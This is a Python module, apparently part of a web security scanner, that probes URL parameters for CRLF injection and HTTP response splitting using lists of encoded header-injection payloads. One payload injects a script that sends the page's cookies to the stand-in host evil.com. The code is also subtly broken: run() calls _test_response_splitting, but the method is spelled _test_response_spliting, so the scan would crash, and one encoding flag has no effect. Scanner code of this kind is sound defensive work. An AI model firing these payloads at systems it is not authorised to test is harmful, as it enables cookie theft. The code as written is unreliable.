"""CRLF injection / HTTP Response Splitting detection."""

from web_scanner.scanner import BaseScanner

# Primary CRLF payloads
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: injected=true",
    "\r\nSet-Cookie: injected=true",
    "%0d%0aSet-Cookie: xss=yes; domain=evil.com",
    "%0d%0aContent-Length: 0%0d%0a%0d%0a<h1>injected</h1>",
    "%0d%0aX-Injected: true",
    "%0aSet-Cookie: crlf=true",
    "%250d%250aSet-Cookie: injected=true",  # double encoding
]

# URL-encoded and double-encoded variants
CRLF_ENCODED_PAYLOADS = [
    # Single URL-encoded
    "%0d%0aX-Test: crlf-test-1",
    "%0dX-Test: crlf-test-1",
    "%0aX-Test: crlf-test-2",
    # Double URL-encoded
    "%250d%250aX-Test: crlf-test-3",
    "%250dX-Test: crlf-test-3",
    "%250aX-Test: crlf-test-4",
    # Triple URL-encoded
    "%25250d%25250aX-Test: crlf-test-5",
    # Mixed encodings
    "%e5%98%8a%e5%98%8dX-Test: crlf-unicode-bypass",  # U+560A U+560D
    "\r%0aX-Test: crlf-mixed-1",
    "%0d\nX-Test: crlf-mixed-2",
]

# Unicode CRLF bypass (some servers decode \u560a\u560d as \r\n)
UNICODE_CRLF_PAYLOADS = [
    "%E5%98%8A%E5%98%8DX-Injected: unicode-bypass",  # \r\n
    "%E5%98%8A%E5%98%8DSet-Cookie: unicode-test=true",
    "%E5%98%8A%E5%98%0DX-Test: partial-unicode",
    "\u560a\u560dX-Test: raw-unicode",                # raw UTF-8 CRLF
]

# Response splitting payloads (create a second HTTP response)
RESPONSE_SPLITTING_PAYLOADS = [
    "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 30%0d%0a%0d%0a<script>alert('split')</script>",
    "%0d%0a%0d%0a<script>document.location='http://evil.com/'+document.cookie</script>",
    "%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>CRLF Split Test</h1>",
]

CRLF_PARAMS = [
    "redirect", "url", "next", "return", "redir", "go",
    "callback", "continue", "returnUrl", "target", "path",
    "referer", "back", "dest", "destination", "uri",
]


class CRLFScanner(BaseScanner):
    """Detect CRLF injection and HTTP Response Splitting vulnerabilities."""

    def run(self) -> list[dict]:
        findings: list[dict] = []

        for param in CRLF_PARAMS:
            # 1. Test primary CRLF payloads
            findings += self._test_payloads(param, CRLF_PAYLOADS)

            # 2. Test URL-encoded / double-encoded variants
            findings += self._test_payloads(param, CRLF_ENCODED_PAYLOADS,
                                            quote_payloads=False)

            # 3. Test Unicode CRLF bypasses
            findings += self._test_payloads(param, UNICODE_CRLF_PAYLOADS,
                                            quote_payloads=False)

            # 4. Test response splitting
            findings += self._test_response_splitting(param)

        return findings

    # -- core tests --------------------------------------------------------

    def _test_payloads(
        self, param: str, payloads: list[str], quote_payloads: bool = True
    ) -> list[dict]:
        findings: list[dict] = []

        for payload in payloads:
            if quote_payloads:
                query_payload = payload  # already encoded
            else:
                query_payload = payload
            resp = self.client.get(f"?{param}={query_payload}",
                                   allow_redirects=False)
            if resp is None:
                continue

            # Check response headers for injected values
            header_finding = self._check_headers(resp, param, payload)
            if header_finding:
                findings.append(header_finding)
                break  # vuln found for this param, move on

            # Check body for reflected content (split page body)
            body_lower = resp.text.lower()
            if "x-test" in body_lower or "x-injected" in body_lower:
                findings.append({
                    "severity": "HIGH",
                    "title": f"CRLF injection — content reflected via '{param}'",
                    "detail": f"Injected content reflected in response body: {payload[:50]}",
                })
                break

            # Check if Set-Cookie appeared in body (not as a real header)
            if "set-cookie:" in body_lower and ("injected" in body_lower or "crlf" in body_lower):
                findings.append({
                    "severity": "HIGH",
                    "title": f"CRLF injection — Set-Cookie in body via '{param}'",
                    "detail": f"Set-Cookie appeared in response body: {payload[:50]}",
                })
                break

        return findings

    def _test_response_spliting(self, param: str) -> list[dict]:
        findings: list[dict] = []
        for payload in RESPONSE_SPLITTING_PAYLOADS:
            resp = self.client.get(f"?{param}={payload}",
                                   allow_redirects=False)
            if resp is None:
                continue

            body_lower = resp.text.lower()
            # Response splitting produces a second response body
            if any(indicator in body_lower for indicator in [
                "http/1.1 200 ok",
                "content-type: text/html",
                "content-length: 30",
                "<h1>crlf split test</h1>",
                "alert('split')",
            ]):
                findings.append({
                    "severity": "CRITICAL",
                    "title": f"HTTP Response Splitting via '{param}'",
                    "detail": (
                        f"Response splitting detected — second response "
                        f"injected via: {payload[:50]}"
                    ),
                })
                break
        return findings

    # -- header check ------------------------------------------------------

    def _check_headers(self, resp, param: str, payload: str):
        """Return a finding dict if injected headers appear in the response."""
        for h_name, h_val in resp.headers.items():
            # Direct match: injected header name or value
            if "x-injected" in h_name.lower() or "x-test" in h_name.lower():
                return {
                    "severity": "CRITICAL",
                    "title": (
                        f"CRLF injection — header injection via '{param}'"
                    ),
                    "detail": (
                        f"Injected HTTP header appeared: "
                        f"{h_name} = {h_val[:80]}"
                    ),
                }
            # Check for injected Set-Cookie in a custom header
            if "injected" in h_val.lower() and h_name.lower() != "set-cookie":
                return {
                    "severity": "CRITICAL",
                    "title": (
                        f"CRLF injection — injected header value via "
                        f"'{param}'"
                    ),
                    "detail": (
                        f"Header {h_name} contains injected value: "
                        f"{h_val[:80]}"
                    ),
                }
            # Unexpected extra Set-Cookie from injection
            if h_name.lower() == "set-cookie" and (
                "injected" in h_val.lower() or "crlf" in h_val.lower()
            ):
                return {
                    "severity": "CRITICAL",
                    "title": (
                        f"CRLF injection — Set-Cookie header via '{param}'"
                    ),
                    "detail": f"Injected cookie: {h_val[:80]}",
                }
        return None
